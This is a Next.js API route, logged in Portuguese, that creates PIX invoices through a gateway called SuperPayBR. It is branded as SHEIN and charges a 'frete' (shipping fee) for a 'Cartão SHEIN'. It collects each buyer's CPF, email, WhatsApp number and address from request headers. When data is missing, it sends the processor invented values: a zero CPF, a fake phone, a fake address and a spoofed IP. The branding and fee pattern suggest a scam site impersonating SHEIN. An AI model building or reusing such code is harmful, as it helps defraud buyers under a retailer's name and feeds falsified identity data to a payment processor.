import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("🚀 Criando fatura PIX SuperPayBR...")

    const { amount, shipping, method } = await request.json()

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("📋 Dados recebidos:", {
      amount,
      shipping,
      method,
      cliente: cpfData.nome,
      email: userEmail,
    })

    // 1. Autenticar com SuperPayBR
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      method: "POST",
    })

    const authData = await authResponse.json()

    if (!authData.success) {
      throw new Error(`Erro de autenticação: ${authData.error}`)
    }

    const accessToken = authData.access_token

    // 2. Gerar external_id único
    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // 3. Preparar dados da fatura
    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: deliveryAddress.street || "Rua Principal",
          number: deliveryAddress.number || "123",
          neighborhood: deliveryAddress.neighborhood || "Centro",
          city: deliveryAddress.city || "São Paulo",
          state: deliveryAddress.state || "SP",
          zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01001000",
          complement: deliveryAddress.complement || "",
        },
        ip: request.headers.get("x-forwarded-for") || "187.1.1.1",
      },
      payment: {
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: `SHEIN_FRETE_${method}`,
        installment: 1,
        order_url: `${request.nextUrl.origin}/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "1",
            title: `Frete ${method} - Cartão SHEIN`,
            qnt: 1,
            amount: Number.parseFloat(amount),
          },
        ],
      },
      shipping: {
        amount: 0,
      },
    }

    console.log("📤 Enviando fatura para SuperPayBR:", {
      external_id: externalId,
      amount: Number.parseFloat(amount),
      client_name: invoiceData.client.name,
    })

    // 4. Criar fatura na SuperPayBR
    const createResponse = await fetch(`${process.env.SUPERPAYBR_API_URL}/v4/invoices`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
        Accept: "application/json",
        "User-Agent": "SHEIN-Card-System/1.0",
      },
      body: JSON.stringify(invoiceData),
    })

    const invoiceResult = await createResponse.json()

    if (!createResponse.ok) {
      console.error("❌ Erro ao criar fatura SuperPayBR:", {
        status: createResponse.status,
        data: invoiceResult,
      })
      throw new Error(`Erro SuperPayBR: ${createResponse.status} - ${JSON.stringify(invoiceResult)}`)
    }

    console.log("✅ Fatura SuperPayBR criada com sucesso!")

    // 5. Extrair dados da resposta
    const invoice = invoiceResult.data || invoiceResult
    const pixPayload = invoice.pix?.payload || invoice.payment?.details?.pix_code
    const qrCodeImage = invoice.pix?.qr_code || invoice.payment?.details?.qrcode

    // 6. Gerar QR Code se necessário
    const qrCodeUrl =
      qrCodeImage ||
      (pixPayload
        ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=250&format=png&margin=1`
        : "/placeholder.svg?height=250&width=250")

    // 7. Estruturar resposta padronizada
    const responseData = {
      id: invoice.id || externalId,
      invoice_id: invoice.invoice_id || invoice.id,
      external_id: externalId,
      pix: {
        payload: pixPayload || "",
        image: qrCodeUrl,
        qr_code: qrCodeUrl,
      },
      status: {
        code: invoice.status?.code || 1,
        title: invoice.status?.title || "Aguardando Pagamento",
        text: invoice.status?.text || "pending",
      },
      valores: {
        bruto: Math.round(Number.parseFloat(amount) * 100),
        liquido: Math.round(Number.parseFloat(amount) * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "real",
    }

    console.log("📊 Resposta estruturada:", {
      external_id: responseData.external_id,
      has_pix_payload: !!responseData.pix.payload,
      has_qr_code: !!responseData.pix.qr_code,
      amount: responseData.valores.bruto / 100,
    })

    return NextResponse.json({
      success: true,
      data: responseData,
      message: "Fatura PIX SuperPayBR criada com sucesso",
    })
  } catch (error) {
    console.error("❌ Erro ao criar fatura SuperPayBR:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Erro desconhecido ao criar fatura SuperPayBR",
      },
      { status: 500 },
    )
  }
}

export async function GET() {
  return NextResponse.json({
    success: true,
    message: "SuperPayBR Create Invoice endpoint ativo",
    timestamp: new Date().toISOString(),
  })
}
